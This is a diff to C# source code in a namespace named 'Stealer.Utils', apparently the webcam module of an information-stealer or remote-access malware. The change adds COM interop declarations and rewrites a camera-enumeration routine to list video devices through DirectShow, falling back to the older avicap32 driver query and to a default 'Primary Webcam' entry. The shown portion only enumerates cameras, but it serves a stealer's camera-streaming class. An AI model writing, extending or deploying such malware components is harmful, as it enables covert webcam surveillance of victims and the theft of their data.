@@ -7,6 +7,42 @@ using System.Threading;
 
 namespace Stealer.Utils
 {
+    [ComImport, Guid("55272A00-42CB-11CE-8135-00AA004BB851"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
+    internal interface IPropertyBag
+    {
+        [PreserveSig]
+        int Read([MarshalAs(UnmanagedType.LPWStr)] string pszPropName, ref object pVar, IntPtr pErrorLog);
+        [PreserveSig]
+        int Write([MarshalAs(UnmanagedType.LPWStr)] string pszPropName, ref object pVar);
+    }
+
+    [ComImport, Guid("29840CD1-7D49-11D0-A558-00A0C911CE86"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
+    internal interface ICreateDevEnum
+    {
+        [PreserveSig]
+        int CreateClassEnumerator([In] ref Guid pType, out IEnumMoniker ppEnumMoniker, [In] int dwFlags);
+    }
+
+    [ComImport, Guid("00000102-0000-0000-C000-000000000046"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
+    internal interface IEnumMoniker
+    {
+        [PreserveSig]
+        int Next([In] int celt, [Out, MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 0)] IMoniker[] rgelt, out int pceltFetched);
+        [PreserveSig]
+        int Skip([In] int celt);
+        [PreserveSig]
+        int Reset();
+        [PreserveSig]
+        int Clone(out IEnumMoniker ppenum);
+    }
+
+    [ComImport, Guid("0000010F-0000-0000-C000-000000000046"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
+    internal interface IMoniker
+    {
+        void BindToObject(IntPtr pbc, IMoniker pmkToLeft, [In] ref Guid riidResult, [MarshalAs(UnmanagedType.IUnknown)] out object ppvResult);
+        void BindToStorage(IntPtr pbc, IMoniker pmkToLeft, [In] ref Guid riid, [MarshalAs(UnmanagedType.IUnknown)] out object ppvResult);
+    }
+
     public static class CameraStream
     {
         private static Thread _captureThread;
@@ -61,24 +97,83 @@ namespace Stealer.Utils
         public static string GetCameraListJson()
         {
             var list = new System.Collections.Generic.List<string>();
-            byte[] nameBuf = new byte[256];
-            byte[] verBuf = new byte[256];
 
-            for (ushort i = 0; i < 10; i++)
+            try
             {
-                Array.Clear(nameBuf, 0, nameBuf.Length);
-                Array.Clear(verBuf, 0, verBuf.Length);
-
-                if (capGetDriverDescriptionA(i, nameBuf, nameBuf.Length, verBuf, verBuf.Length))
+                Guid category = new Guid("860BB310-5D01-11d0-BD3B-00A0C911CE86"); // CLSID_VideoInputDeviceCategory
+                Guid clsidEnum = new Guid("62BE5D10-60EB-11d0-BD3B-00A0C911CE86"); // CLSID_SystemDeviceEnum
+                Type typeEnum = Type.GetTypeFromCLSID(clsidEnum);
+                if (typeEnum != null)
                 {
-                    string name = System.Text.Encoding.ASCII.GetString(nameBuf).TrimEnd('\0', ' ', '\r', '\n');
-                    if (!string.IsNullOrEmpty(name))
+                    ICreateDevEnum devEnum = (ICreateDevEnum)Activator.CreateInstance(typeEnum);
+                    IEnumMoniker enumMoniker;
+                    if (devEnum.CreateClassEnumerator(ref category, out enumMoniker, 0) == 0 && enumMoniker != null)
                     {
-                        // Escape quotes for JSON
-                        name = name.Replace("\\", "\\\\").Replace("\"", "\\\"");
-                        list.Add("{\"id\":" + i + ",\"name\":\"" + name + "\"}");
+                        IMoniker[] monikers = new IMoniker[1];
+                        int fetched;
+                        int index = 0;
+                        Guid iidPropertyBag = typeof(IPropertyBag).GUID;
+
+                        while (enumMoniker.Next(1, monikers, out fetched) == 0 && fetched > 0 && monikers[0] != null)
+                        {
+                            try
+                            {
+                                object bagObj;
+                                monikers[0].BindToStorage(IntPtr.Zero, null, ref iidPropertyBag, out bagObj);
+                                IPropertyBag bag = bagObj as IPropertyBag;
+                                if (bag != null)
+                                {
+                                    object val = null;
+                                    if (bag.Read("FriendlyName", ref val, IntPtr.Zero) == 0 && val != null)
+                                    {
+                                        string name = val.ToString().Trim();
+                                        if (!string.IsNullOrEmpty(name))
+                                        {
+                                            name = name.Replace("\\", "\\\\").Replace("\"", "\\\"");
+                                            list.Add("{\"id\":" + index + ",\"name\":\"" + name + "\"}");
+                                        }
+                                    }
+                                }
+                            }
+                            catch { }
+                            finally
+                            {
+                                try { Marshal.ReleaseComObject(monikers[0]); } catch { }
+                            }
+                            index++;
+                        }
+                        try { Marshal.ReleaseComObject(enumMoniker); } catch { }
                     }
                 }
+            }
+            catch { }
+
+            // Fallback to avicap32 if DirectShow enumerator had 0 entries
+            if (list.Count == 0)
+            {
+                byte[] nameBuf = new byte[256];
+                byte[] verBuf = new byte[256];
+
+                for (ushort i = 0; i < 10; i++)
+                {
+                    Array.Clear(nameBuf, 0, nameBuf.Length);
+                    Array.Clear(verBuf, 0, verBuf.Length);
+
+                    if (capGetDriverDescriptionA(i, nameBuf, nameBuf.Length, verBuf, verBuf.Length))
+                    {
+                        string name = System.Text.Encoding.ASCII.GetString(nameBuf).TrimEnd('\0', ' ', '\r', '\n');
+                        if (!string.IsNullOrEmpty(name))
+                        {
+                            name = name.Replace("\\", "\\\\").Replace("\"", "\\\"");
+                            list.Add("{\"id\":" + i + ",\"name\":\"" + name + "\"}");
+                        }
+                    }
+                }
+            }
+
+            if (list.Count == 0)
+            {
+                list.Add("{\"id\":0,\"name\":\"Primary Webcam\"}");
             }
 
             return "[" + string.Join(",", list.ToArray()) + "]";
